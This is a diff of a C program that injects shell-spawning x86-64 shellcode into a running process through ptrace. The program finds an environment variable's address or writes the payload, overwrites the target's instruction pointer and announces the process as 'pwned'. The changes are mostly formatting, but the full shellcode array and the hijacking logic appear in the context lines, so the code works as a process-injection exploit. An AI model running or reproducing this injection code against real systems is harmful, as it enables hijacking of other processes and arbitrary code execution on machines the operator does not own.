@@ -13,10 +13,10 @@
 
 
 char shellcode[] __attribute__((section(".myshellcode,\"awx\",@progbits#"))) = 	"\xeb\x1f\x5f\x48\x31\xc0\x50\x48\x89\xe2\x57\x48\x89\xe6\x48"
-										 										"\x83\xc0\x3b\x0f\x05\x48\x31\xff\x48\x83\xc0\x7f\x48\x83\xc0"
-																				"\x2d\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"; 
+										"\x83\xc0\x3b\x0f\x05\x48\x31\xff\x48\x83\xc0\x7f\x48\x83\xc0"
+										"\x2d\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"; 
 		  							
-main(int argc, char **argv)
+int main(int argc, char **argv)
 {
 	char *envVar, *name;
 	int c,i,size;
@@ -47,19 +47,19 @@ main(int argc, char **argv)
 	{
 		switch(c) 
    		{
-    		case 'p':
-        		pid = atoi(optarg);
-        		break;
-    		case 'e':
-        		envVar = strdup(optarg);
-           		break;
-    		case 'n':
-        		name = strdup(optarg);
-       			break;
-    		default:
-    			usage();
-    			break;
-    	}	
+    			case 'p':
+        			pid = atoi(optarg);
+        			break;
+    			case 'e':
+        			envVar = strdup(optarg);
+           			break;
+    			case 'n':
+        			name = strdup(optarg);
+       				break;
+    			default:
+    				usage();
+    				break;
+    		}	
 	}
 
 	if(!pid || (!envVar || !name))
@@ -100,10 +100,10 @@ main(int argc, char **argv)
 		printf(" Done.\n");
 		printf(" Overwriting tracee's $rip with $rsp..\n\n");
         
-        registers.rip = registers.rsp + 2;
-        ptrace(PTRACE_SETREGS, pid, NULL, &registers);
+        	registers.rip = registers.rsp + 2;
+        	ptrace(PTRACE_SETREGS, pid, NULL, &registers);
 
-    }
+    	}
 	else
 	{
 		int check = 0;
@@ -119,7 +119,7 @@ main(int argc, char **argv)
 		memcpy(chunk, envAddr, size); 
 		envAddr += (strlen(argv[0]) - strlen(name))*2;
 		
-    	printf("\n~~~~~~ If ASLR is disabled, %s variable will be at %p ~~~~~~~\n", envVar, envAddr);
+    		printf("\n~~~~~~ If ASLR is disabled, %s variable will be at %p ~~~~~~~\n", envVar, envAddr);
 		
 		pointed = ptrace(PTRACE_PEEKTEXT, pid, envAddr, NULL);
 
@@ -153,7 +153,7 @@ main(int argc, char **argv)
 				
 				registers.rip = wanted;
 				ptrace(PTRACE_SETREGS, pid, NULL, &registers);
-      		}
+      			}
 			else
 			{
 				printf(" %s's address not found.\n", envVar);
@@ -186,9 +186,11 @@ main(int argc, char **argv)
 	ptrace(PTRACE_GETREGS, pid, NULL, &registers);
 	pointed = ptrace(PTRACE_PEEKTEXT, pid, registers.rip, NULL);
 
-    printf(" Content of $rip: 0x%.16llx\n", registers.rip);
-    printf(" Content of addr pointed by $rip: 0x%.16llx\n", pointed);
+    	printf(" Content of $rip: 0x%.16llx\n", registers.rip);
+    	printf(" Content of addr pointed by $rip: 0x%.16llx\n", pointed);
 	printf("******* Process[%d] pwned! *******\n", pid);
 		
 	ptrace(PTRACE_DETACH, pid, NULL,NULL);
+	
+	exit(0);	
 }
